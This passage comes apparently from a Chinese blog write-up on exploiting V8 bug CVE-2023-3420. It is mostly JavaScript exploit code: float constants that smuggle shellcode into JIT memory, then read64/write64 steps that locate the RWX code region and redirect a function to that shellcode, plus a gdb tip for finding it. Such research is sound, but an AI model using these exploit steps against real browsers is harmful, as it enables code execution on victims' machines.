<div class="code-snippet"><pre data-theme="light" class="code-snippet__pre code-snippet__pre--light"><code class="language-js language-js"><span style="color:#A0ADA0">// https://github.com/github/securitylab/blob/main/SecurityExploits/Chrome/v8/CVE_2023_3420/poc.js</span><br><span style="color:#AB5959">function</span><span style="color:#59873A"> func</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><span style="color:#999999"> </span><span style="color:#2993a3">{</span><br><span style="color:#1E754F">    return</span><span style="color:#999999"> </span><span style="color:#1e754f">[</span><span style="color:#2F798A">1.9553825422107533e-246</span><span style="color:#999999">,</span><span style="color:#2F798A"> 1.9560612558242147e-246</span><span style="color:#999999">,</span><span style="color:#2F798A"> 1.9995714719542577e-246</span><span style="color:#999999">,</span><span style="color:#2F798A"> 1.9533767332674093e-246</span><span style="color:#999999">,</span><span style="color:#2F798A"> 2.6348604765229606e-284</span><span style="color:#1e754f">]</span><span style="color:#999999">;</span><br><span style="color:#2993a3">}</span><br><span style="color:#1E754F">for</span><span style="color:#999999"> </span><span style="color:#2993a3">(</span><span style="color:#AB5959">let</span><span style="color:#B07D48"> i</span><span style="color:#999999"> =</span><span style="color:#2F798A"> 0</span><span style="color:#999999">;</span><span style="color:#B07D48"> i</span><span style="color:#999999"> </span><span style="color:#999999">&#x3C;</span><span style="color:#2F798A"> 200000</span><span style="color:#999999">;</span><span style="color:#B07D48"> i</span><span style="color:#AB5959">++</span><span style="color:#2993a3">)</span><span style="color:#59873A"> func</span><span style="color:#2993a3">(</span><span style="color:#2F798A">0</span><span style="color:#2993a3">)</span><span style="color:#999999">;</span><br></code></pre><pre data-theme="dark" class="code-snippet__pre code-snippet__pre--dark"><code class="language-js language-js"><span style="color:#758575DD">// https://github.com/github/securitylab/blob/main/SecurityExploits/Chrome/v8/CVE_2023_3420/poc.js</span><br><span style="color:#CB7676">function</span><span style="color:#80A665"> func</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><span style="color:#666666"> </span><span style="color:#5eaab5">{</span><br><span style="color:#4D9375">    return</span><span style="color:#666666"> </span><span style="color:#4d9375">[</span><span style="color:#4C9A91">1.9553825422107533e-246</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 1.9560612558242147e-246</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 1.9995714719542577e-246</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 1.9533767332674093e-246</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 2.6348604765229606e-284</span><span style="color:#4d9375">]</span><span style="color:#666666">;</span><br><span style="color:#5eaab5">}</span><br><span style="color:#4D9375">for</span><span style="color:#666666"> </span><span style="color:#5eaab5">(</span><span style="color:#CB7676">let</span><span style="color:#BD976A"> i</span><span style="color:#666666"> =</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">;</span><span style="color:#BD976A"> i</span><span style="color:#666666"> </span><span style="color:#666666">&#x3C;</span><span style="color:#4C9A91"> 200000</span><span style="color:#666666">;</span><span style="color:#BD976A"> i</span><span style="color:#CB7676">++</span><span style="color:#5eaab5">)</span><span style="color:#80A665"> func</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">0</span><span style="color:#5eaab5">)</span><span style="color:#666666">;</span><br></code></pre></div>
<p>注意 JIT 的内存空间中存在 hole，因此需要使用特殊的 shellcode。</p>
<p>然后泄漏 function 的 <code class="inline-code">code</code> 字段，找到 rwx 段地址，并用 <code class="inline-code">write64</code> 原语替换为 shellcode 所在地址。</p>
<div class="code-snippet"><pre data-theme="light" class="code-snippet__pre code-snippet__pre--light"><code class="language-js language-js"><span style="color:#AB5959">let</span><span style="color:#B07D48"> func_addr</span><span style="color:#999999"> =</span><span style="color:#59873A"> addrOf</span><span style="color:#2993a3">(</span><span style="color:#B07D48">func</span><span style="color:#2993a3">)</span><span style="color:#999999">;</span><br><span style="color:#B07D48">console</span><span style="color:#999999">.</span><span style="color:#59873A">log</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">func_addr =></span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#B07D48"> func_addr</span><span style="color:#999999">.</span><span style="color:#59873A">hex</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><span style="color:#999999">;</span><br><span style="color:#AB5959">let</span><span style="color:#B07D48"> code</span><span style="color:#999999"> =</span><span style="color:#59873A"> read64</span><span style="color:#2993a3">(</span><span style="color:#B07D48">func_addr</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> </span><span style="color:#AB5959">></span><span style="color:#AB5959">></span><span style="color:#2F798A"> 32</span><span style="color:#AB5959">n</span><span style="color:#999999">;</span><br><span style="color:#B07D48">console</span><span style="color:#999999">.</span><span style="color:#59873A">log</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">code =></span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#B07D48"> code</span><span style="color:#999999">.</span><span style="color:#59873A">hex</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><span style="color:#999999">;</span><br><span style="color:#AB5959">let</span><span style="color:#B07D48"> rwx_addr</span><span style="color:#999999"> =</span><span style="color:#59873A"> read64</span><span style="color:#2993a3">(</span><span style="color:#B07D48">code</span><span style="color:#AB5959"> +</span><span style="color:#2F798A"> 0x14</span><span style="color:#AB5959">n</span><span style="color:#AB5959"> -</span><span style="color:#2F798A"> 8</span><span style="color:#AB5959">n</span><span style="color:#2993a3">)</span><span style="color:#999999">;</span><br><span style="color:#B07D48">console</span><span style="color:#999999">.</span><span style="color:#59873A">log</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">RWX addr =></span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#B07D48"> rwx_addr</span><span style="color:#999999">.</span><span style="color:#59873A">hex</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><span style="color:#999999">;</span><br><span style="color:#AB5959">let</span><span style="color:#B07D48"> shellcode_addr</span><span style="color:#999999"> =</span><span style="color:#B07D48"> rwx_addr</span><span style="color:#AB5959"> +</span><span style="color:#2F798A"> 0x5c</span><span style="color:#AB5959">n</span><span style="color:#999999">;</span><br><span style="color:#B07D48">console</span><span style="color:#999999">.</span><span style="color:#59873A">log</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">shellcode_addr =></span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#B07D48"> shellcode_addr</span><span style="color:#999999">.</span><span style="color:#59873A">hex</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><span style="color:#999999">;</span><br><br><span style="color:#59873A">write64</span><span style="color:#2993a3">(</span><span style="color:#B07D48">code</span><span style="color:#AB5959"> +</span><span style="color:#2F798A"> 0x14</span><span style="color:#AB5959">n</span><span style="color:#AB5959"> -</span><span style="color:#2F798A"> 8</span><span style="color:#AB5959">n</span><span style="color:#999999">,</span><span style="color:#B07D48"> shellcode_addr</span><span style="color:#2993a3">)</span><span style="color:#999999">;</span><br><span style="color:#59873A">func</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><span style="color:#999999">;</span><br></code></pre><pre data-theme="dark" class="code-snippet__pre code-snippet__pre--dark"><code class="language-js language-js"><span style="color:#CB7676">let</span><span style="color:#BD976A"> func_addr</span><span style="color:#666666"> =</span><span style="color:#80A665"> addrOf</span><span style="color:#5eaab5">(</span><span style="color:#BD976A">func</span><span style="color:#5eaab5">)</span><span style="color:#666666">;</span><br><span style="color:#BD976A">console</span><span style="color:#666666">.</span><span style="color:#80A665">log</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">func_addr =></span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#BD976A"> func_addr</span><span style="color:#666666">.</span><span style="color:#80A665">hex</span><span style="color:#4d9375">(</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><span style="color:#666666">;</span><br><span style="color:#CB7676">let</span><span style="color:#BD976A"> code</span><span style="color:#666666"> =</span><span style="color:#80A665"> read64</span><span style="color:#5eaab5">(</span><span style="color:#BD976A">func_addr</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> </span><span style="color:#CB7676">></span><span style="color:#CB7676">></span><span style="color:#4C9A91"> 32</span><span style="color:#CB7676">n</span><span style="color:#666666">;</span><br><span style="color:#BD976A">console</span><span style="color:#666666">.</span><span style="color:#80A665">log</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">code =></span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#BD976A"> code</span><span style="color:#666666">.</span><span style="color:#80A665">hex</span><span style="color:#4d9375">(</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><span style="color:#666666">;</span><br><span style="color:#CB7676">let</span><span style="color:#BD976A"> rwx_addr</span><span style="color:#666666"> =</span><span style="color:#80A665"> read64</span><span style="color:#5eaab5">(</span><span style="color:#BD976A">code</span><span style="color:#CB7676"> +</span><span style="color:#4C9A91"> 0x14</span><span style="color:#CB7676">n</span><span style="color:#CB7676"> -</span><span style="color:#4C9A91"> 8</span><span style="color:#CB7676">n</span><span style="color:#5eaab5">)</span><span style="color:#666666">;</span><br><span style="color:#BD976A">console</span><span style="color:#666666">.</span><span style="color:#80A665">log</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">RWX addr =></span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#BD976A"> rwx_addr</span><span style="color:#666666">.</span><span style="color:#80A665">hex</span><span style="color:#4d9375">(</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><span style="color:#666666">;</span><br><span style="color:#CB7676">let</span><span style="color:#BD976A"> shellcode_addr</span><span style="color:#666666"> =</span><span style="color:#BD976A"> rwx_addr</span><span style="color:#CB7676"> +</span><span style="color:#4C9A91"> 0x5c</span><span style="color:#CB7676">n</span><span style="color:#666666">;</span><br><span style="color:#BD976A">console</span><span style="color:#666666">.</span><span style="color:#80A665">log</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">shellcode_addr =></span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#BD976A"> shellcode_addr</span><span style="color:#666666">.</span><span style="color:#80A665">hex</span><span style="color:#4d9375">(</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><span style="color:#666666">;</span><br><br><span style="color:#80A665">write64</span><span style="color:#5eaab5">(</span><span style="color:#BD976A">code</span><span style="color:#CB7676"> +</span><span style="color:#4C9A91"> 0x14</span><span style="color:#CB7676">n</span><span style="color:#CB7676"> -</span><span style="color:#4C9A91"> 8</span><span style="color:#CB7676">n</span><span style="color:#666666">,</span><span style="color:#BD976A"> shellcode_addr</span><span style="color:#5eaab5">)</span><span style="color:#666666">;</span><br><span style="color:#80A665">func</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><span style="color:#666666">;</span><br></code></pre></div>
<p>寻找 shellcode 所在地址时可以使用 gdb 的 search 工具：<code class="inline-code">search -8 0xceb580068732f68 [anon_5555b7a00]</code> 可以在指定段内搜索。</p></div></div></div><footer class="footer"><div class="footer-row footer-links"><span class="footer-label">保持联系</span><a href="mailto:xzy1476569428@163.com" class="footer-link"><p><a href="mailto:xzy1476569428@163.com" title="mailto:xzy1476569428@163.com">xzy1476569428@163.com</a></p></a><span aria-hidden="true" class="footer-separator">·</span><a href="/rss.xml" class="footer-link">RSS</a><span aria-hidden="true" class="footer-separator">·</span><a href="https://github.com/LittFlower/my_blog" class="footer-link"><p>GitHub</p></a></div><div class="footer-row footer-meta"><span><p>本站基于
<a href="https://github.com/unvariant/blog">unvariant/blog</a>
改造，除特别说明外内容以 CC BY 4.0 协议共享。</p></span></div></footer></body></html>